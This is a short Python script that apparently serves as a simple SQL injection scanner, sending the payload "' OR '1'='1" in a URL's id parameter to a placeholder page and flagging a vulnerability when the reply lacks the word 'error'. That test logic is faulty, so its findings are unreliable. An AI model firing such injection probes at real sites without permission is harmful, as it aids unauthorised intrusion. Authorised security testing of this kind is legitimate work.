import requests

def scan_sql_injection(url):
    payload = "' OR '1'='1"
    full_url = f"{url}?id={payload}"
    response = requests.get(full_url)
    if "error" not in response.text.lower():
        print(f"Possible SQL Injection vulnerability at: {url}")

url = "http://example.com/vulnerable_page"
scan_sql_injection(url)
